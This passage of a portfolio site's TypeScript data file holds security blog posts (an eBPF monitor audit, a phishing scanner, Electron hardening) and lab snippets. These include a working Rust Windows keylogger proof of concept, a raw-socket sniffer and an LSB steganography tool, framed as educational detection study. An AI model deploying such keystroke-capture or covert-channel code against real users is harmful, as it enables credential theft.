These events can have legitimate causes. Observing an injection primitive or a shell connection does not by itself prove an attack. Kernel support, tracepoint availability and verifier acceptance must be checked on the target system; the verifier is not a general safety, privacy or detection-accuracy guarantee.

### The intended data path

1. **eBPF source:** collects PID, UID/GID, process name, filename, cgroup ID and selected connection metadata, then calls \`bpf_perf_event_output\` into a perf-event array. This is **perf-buffer transport**, not a BPF ring-buffer implementation. The probe currently sets PPID to zero.
2. **Go source:** reads perf records, parses container IDs from \`/proc/<pid>/cgroup\`, adds pod hints from the agent's environment/hostname and evaluates heuristic rules. Those hints are not verified per-process Kubernetes attribution or container-image discovery.
3. **Presentation:** the HTTP agent emits \`text/event-stream\` at \`/events\`; the React client consumes it through \`EventSource\`. The implemented protocol is **Server-Sent Events**, despite older WebSocket wording in parts of the documentation and UI.

No measured low-overhead claim follows from using perf buffers. Event loss, transport correctness, dashboard rendering and end-to-end latency need runtime evidence.

### What the rules express

The Go rules flag non-root shell/known-port connection indicators, ptrace/executable-mmap/memfd primitives, and suspicious execution paths. They are broad educational heuristics. The audit did not establish attack detection rates, false-positive rates or resistance to an adversarial workload.

### Read-only collection is not least-privilege deployment

The probe source observes metadata rather than modifying syscall arguments or packet contents. It does not capture packet payloads. Process names and filenames can still contain sensitive information, so “metadata only” is not a guarantee that secrets cannot appear.

The Helm DaemonSet template explicitly sets **\`privileged: true\`**, enables **\`hostPID\`**, and adds **\`BPF\`, \`SYS_ADMIN\` and \`SYS_PTRACE\`** capabilities. It is not a BPF/SYS_ADMIN-only or least-privilege deployment. The repository's security policy limits simulations to isolated educational environments and excludes production use.

Local reverse-shell and ptrace demonstration scripts are supplied. They were not executed in this audit, and their presence does not establish safe behavior on every host or successful end-to-end detection.

### What can be claimed

The repository makes the component boundaries visible: probe code, perf reading, enrichment, heuristic decisions, SSE transport and dashboard presentation. It provides a scaffold for studying how those pieces fit together. Live probe attachment, kernel delivery, Kubernetes deployment, performance, privacy and production hardening remain unverified here.

### Pinned sources

- [Read-only collector programs](https://github.com/Raoof128/eBPF-Cloud-Runtime-Security-Monitor/blob/40a88a63d06e0c9c9f286dbaf17a6291f9052ce2/ebpf/process_monitor.c)
- [Go startup and perf reader](https://github.com/Raoof128/eBPF-Cloud-Runtime-Security-Monitor/blob/40a88a63d06e0c9c9f286dbaf17a6291f9052ce2/agent/main.go)
- [SSE server](https://github.com/Raoof128/eBPF-Cloud-Runtime-Security-Monitor/blob/40a88a63d06e0c9c9f286dbaf17a6291f9052ce2/agent/server.go)
- [Limited metadata enrichment](https://github.com/Raoof128/eBPF-Cloud-Runtime-Security-Monitor/blob/40a88a63d06e0c9c9f286dbaf17a6291f9052ce2/agent/containers.go)
- [Privileged Helm template](https://github.com/Raoof128/eBPF-Cloud-Runtime-Security-Monitor/blob/40a88a63d06e0c9c9f286dbaf17a6291f9052ce2/deploy/helm/templates/daemonset.yaml)
- [Security scope](https://github.com/Raoof128/eBPF-Cloud-Runtime-Security-Monitor/blob/40a88a63d06e0c9c9f286dbaf17a6291f9052ce2/SECURITY.md)
`,
  },
  {
    slug: "kmp-security",
    title: "Building Offline-First Security Tools with KMP",
    date: "2025-01-02",
    updatedAt: "2026-11-04",
    tag: "Kotlin",
    takeaway:
      "An offline QR and URL phishing scanner in Kotlin Multiplatform: ensemble ML plus 25 heuristics at 87% F1 and under 5 ms.",
    content: `
## One security core, five platforms

**Mehr Guard** aims to reduce cross-platform drift with a shared Kotlin Multiplatform detection core and platform interfaces for Android, iOS, JVM, JS and WebAssembly. Shared source alone does not establish identical behavior in every build; platform parity remains a separate check.

### What lives in \`commonMain\`

The security logic is platform-agnostic and lives once, in shared code:

- **Ensemble model**: logistic regression, gradient boosting and decision rules score URL features.
- **Heuristics engine**: 25 heuristics, including homograph and punycode look-alikes, brand-impersonation patterns, redirect chains, suspicious TLDs, embedded credentials, and IP-literal hosts.
- **Threat-intelligence lists**: allow/deny sets, versioned centrally.

KMP's \`expect\`/\`actual\` boundaries cover platform services, the QR-camera bridge and UI integration. The repository reports ~100% shared detection logic (~52% of total code); native integrations and browser variants still need their own review.

### Offline by construction

PhishingEngine scores URL strings locally without requiring a cloud reputation lookup. The offline judge script runs unit checks for completion, determinism and timing. Their source explicitly says they do not block network access, so they do not independently attest that every build or UI makes zero outbound connections.

### The numbers

| Metric | Value |
|--------|-------|
| F1 (ensemble ML plus 25 heuristics) | 87% |
| Analysis time | under 5 ms |
| Red-team mode | 19 scenarios |
| Platform targets | 5 (Android, iOS, JVM, JS, Wasm) |

The 19-scenario red-team mode exercises known phishing patterns.
    `,
  },
  {
    slug: "electron-security",
    title: "Securing Electron Apps: A Practical Guide",
    date: "2024-12-20",
    updatedAt: "2026-11-04",
    tag: "Electron",
    takeaway:
      "Separating renderer privileges, credential storage and deliberate AI data sharing in a desktop Git client.",
    content: `
## Why Electron needs explicit boundaries

An Electron application combines Chromium renderer processes with a privileged Node.js main process. A renderer compromise can become much more damaging when it can call filesystem or process APIs. GitSwitch uses this boundary for a Git client that manages SSH identities, hosting tokens and AI-assisted commits. This article describes the public source snapshot reviewed on 4 November 2026, rather than claiming that these controls make every build or deployment secure.

### The isolation contract

| Setting | Source configuration | Purpose |
|---------|----------------------|---------|
| \`contextIsolation\` | \`true\` | Separate the page and preload JavaScript contexts |
| \`sandbox\` | \`true\` | Restrict the renderer's operating-system access |
| \`nodeIntegration\` | \`false\` | Keep Node.js built-ins out of the page |
| Privileged operations | Main process and a constrained IPC bridge | Validate requests before Git, filesystem, credential or network work |

These settings are visible in GitSwitch's main-window configuration. They reduce the renderer's direct privileges; the preload bridge, main-process handlers and dependencies still require review. The repository's threat model documents validation, approved repository paths, timeouts and request limits as further controls, rather than treating isolation as a complete security proof.

### Storing credentials accurately

The main process encrypts credential files using Electron \`safeStorage\`. It checks \`safeStorage.isEncryptionAvailable()\` before writing and throws when encryption is unavailable. This is encrypted application storage backed by the platform's available protection, rather than a claim that every token is stored directly as a native keychain entry.

The implementation decrypts credentials into JavaScript strings when needed. After a successful AI request, it assigns an empty string to its local \`apiKey\` variable. That drops a reference; it does not prove that immutable string contents have been overwritten, removed from crash dumps or erased from every memory copy. A portfolio should describe this as limited reference cleanup, not guaranteed secret wiping.

### AI data sharing is a separate decision

The current client supports Gemini, OpenAI, Anthropic and local-model endpoints, plus offline heuristic commit generation. Cloud generation checks an explicit consent setting before proceeding. The source also bounds the diff context, supports optional pattern-based redaction and passes a configured timeout to the selected provider.

Those controls govern this AI workflow. They do not make Gemini the application's only outbound connection: Git hosting, remotes, other configured providers and update services have their own network paths. Pattern-based redaction can miss sensitive material, and a local endpoint's privacy depends on where and how it runs. Offline heuristics avoid a model request for that generation path but do not imply that every other Git operation is offline.

### Evidence and limits

At the reviewed revision, the package manifest declares Electron ^39.2.6 and React ^19.2.1. The threat model records remaining constraints, including dependence on available OS-backed storage, process-local rate limits and release-signing/notarisation requirements. These are implementation controls with a defined scope, not a guarantee against arbitrary code execution or all credential disclosure.

Sources: [main-window configuration](https://github.com/Raoof128/GitSwitch/blob/5161409a0bc640b105c2a5438055b009425d6843/src/main/index.ts#L87-L106), [credential storage](https://github.com/Raoof128/GitSwitch/blob/5161409a0bc640b105c2a5438055b009425d6843/src/main/secure/key-manager.ts#L96-L132), [AI orchestration](https://github.com/Raoof128/GitSwitch/blob/5161409a0bc640b105c2a5438055b009425d6843/src/main/ai/commit-generate.ts#L163-L306), [manifest](https://github.com/Raoof128/GitSwitch/blob/5161409a0bc640b105c2a5438055b009425d6843/package.json#L71-L86) and [documented residual risks](https://github.com/Raoof128/GitSwitch/blob/5161409a0bc640b105c2a5438055b009425d6843/THREAT_MODEL.md#L216-L225).
`,
  },
];

export interface LabExperiment {
  id: string;
  title: string;
  status: "ACTIVE" | "ARCHIVED" | "CONCEPT";
  description: string;
  tech: string[];
  objective: string;
  constraints: string;
  codeSnippet: string;
}

export const labExperiments: LabExperiment[] = [
  {
    id: "001",
    title: "Rust Keylogger PoC",
    status: "ARCHIVED",
    description:
      "A Windows-based keylogger demonstrating the usage of SetWindowsHookEx and proper hook chaining for educational detection analysis.",
    tech: ["Rust", "WinAPI", "Unsafe"],
    objective:
      "Understand how Windows messaging hooks can be abused for credential interception and how EDRs detect hook injection.",
    constraints:
      "Educational purpose only. Does not persist across reboots. Logs to stdout only.",
    codeSnippet: `use std::ptr;
use winapi::shared::minwindef::{LPARAM, LRESULT, WPARAM};
use winapi::shared::windef::HHOOK;
use winapi::um::winuser::{
    CallNextHookEx, DispatchMessageW, GetMessageW, SetWindowsHookExW,
    TranslateMessage, UnhookWindowsHookEx, WH_KEYBOARD_LL, KBDLLHOOKSTRUCT,
};

static mut HOOK: HHOOK = ptr::null_mut();

unsafe extern "system" fn keyboard_proc(
    n_code: i32,
    w_param: WPARAM,
    l_param: LPARAM,
) -> LRESULT {
    if n_code >= 0 {
        let kb = &*(l_param as *const KBDLLHOOKSTRUCT);
        // WM_KEYDOWN = 0x0100
        if w_param as u32 == 0x0100 {
            println!("[KEY] vkCode={:03} scanCode={:#06x}", kb.vkCode, kb.scanCode);
        }
    }
    CallNextHookEx(HOOK, n_code, w_param, l_param)
}

fn main() {
    unsafe {
        HOOK = SetWindowsHookExW(WH_KEYBOARD_LL, Some(keyboard_proc), ptr::null_mut(), 0);
        assert!(!HOOK.is_null(), "Failed to install hook");

        let mut msg = std::mem::zeroed();
        while GetMessageW(&mut msg, ptr::null_mut(), 0, 0) > 0 {
            TranslateMessage(&msg);
            DispatchMessageW(&msg);
        }
        UnhookWindowsHookEx(HOOK);
    }
}`,
  },
  {
    id: "002",
    title: "Raw Socket Packet Sniffer",
    status: "ACTIVE",
    description:
      "Python script using raw sockets to capture and parse TCP/IP headers manually. Prints TCP SYN packets as the starting point for scan detection, without relying on libpcap.",
    tech: ["Python", "Networking", "Raw Sockets"],
    objective:
      "Manually parse IP/TCP headers to understand protocol structures and detect scanning patterns without relying on Wireshark.",
    constraints:
      "Requires root/admin privileges. Linux only (AF_PACKET). For macOS use BPF socket instead.",
    codeSnippet: `import socket
import struct

ETH_P_IP = 0x0800

def parse_ip(raw: bytes) -> tuple[int, int, str, str]:
    # Skip 14-byte Ethernet header on AF_PACKET
    iph = struct.unpack("!BBHHHBBH4s4s", raw[14:34])
    ihl = (iph[0] & 0xF) * 4
    proto = iph[6]
    src = socket.inet_ntoa(iph[8])
    dst = socket.inet_ntoa(iph[9])
    return ihl + 14, proto, src, dst

def parse_tcp(raw: bytes, offset: int) -> tuple[int, int, int]:
    tcph = struct.unpack("!HHLLBBHHH", raw[offset:offset + 20])
    flags = tcph[5]
    syn = (flags & 0x02) >> 1
    return tcph[0], tcph[1], syn

def sniff() -> None:
    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETH_P_IP))
    print("[*] Sniffing TCP — Ctrl+C to stop")
    while True:
        raw, _ = sock.recvfrom(65535)
        try:
            offset, proto, src, dst = parse_ip(raw)
            if proto != 6:  # TCP only
                continue
            sp, dp, syn = parse_tcp(raw, offset)
            if syn:
                print(f"[SYN] {src}:{sp} -> {dst}:{dp}")
        except struct.error:
            continue

if __name__ == "__main__":
    sniff()`,
  },
  {
    id: "003",
    title: "Steganography Tool",
    status: "CONCEPT",
    description:
      "LSB (Least Significant Bit) image steganography in Go. Embeds a length-prefixed payload into the red channel of PNG pixels.",
    tech: ["Go", "Cryptography", "Image Processing"],
    objective:
      "Implement a covert channel by modifying the least significant bits of image pixel data to embed a length-prefixed payload.",
    constraints:
      "Payload size limited to (width × height) / 8 bytes minus the 4-byte length header. Not robust against JPEG re-encoding or image resizing.",
    codeSnippet: `package main

import (
	"encoding/binary"
	"fmt"
	"image"
	"image/color"
	"image/png"
	"os"
)

func embed(img *image.NRGBA, payload []byte) error {
	capacity := img.Bounds().Dx() * img.Bounds().Dy() / 8
	if capacity < 4 || len(payload) > capacity-4 || uint64(len(payload)) > uint64(^uint32(0)) {
		return fmt.Errorf("image too small for payload")
	}
	header := make([]byte, 4)
	binary.BigEndian.PutUint32(header, uint32(len(payload)))
	bits := append(header, payload...)

	idx := 0
	for y := img.Bounds().Min.Y; y < img.Bounds().Max.Y; y++ {
		for x := img.Bounds().Min.X; x < img.Bounds().Max.X; x++ {
			if idx >= len(bits)*8 {
				return nil
			}
			c := img.NRGBAAt(x, y)
			bytePos, bitPos := idx/8, uint(7-idx%8)
			bit := (bits[bytePos] >> bitPos) & 1
			c.R = (c.R & 0xFE) | bit
			img.SetNRGBA(x, y, color.NRGBA{R: c.R, G: c.G, B: c.B, A: c.A})
			idx++
		}
	}
	if idx == len(bits)*8 {
		return nil // The payload filled the image exactly.
	}
	return fmt.Errorf("image too small for payload")
}

func run() error {
	f, err := os.Open("cover.png")
	if err != nil {
		return fmt.Errorf("open cover: %w", err)
	}
	defer f.Close()
	src, err := png.Decode(f)
	if err != nil {
		return fmt.Errorf("decode cover: %w", err)
	}

	dst := image.NewNRGBA(src.Bounds())
	for y := dst.Bounds().Min.Y; y < dst.Bounds().Max.Y; y++ {
		for x := dst.Bounds().Min.X; x < dst.Bounds().Max.X; x++ {
			dst.Set(x, y, src.At(x, y))
		}
	}
	if err := embed(dst, []byte("HIDDEN_MESSAGE")); err != nil {
		return err
	}

	out, err := os.Create("stego.png")
	if err != nil {
		return fmt.Errorf("create output: %w", err)
	}
	defer out.Close()
	if err := png.Encode(out, dst); err != nil {
		return fmt.Errorf("encode output: %w", err)
	}
	if err := out.Close(); err != nil {
		return fmt.Errorf("close output: %w", err)
	}
	fmt.Println("Done — payload embedded into stego.png")
	return nil
}

func main() {
	if err := run(); err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}
}`,
  },
];
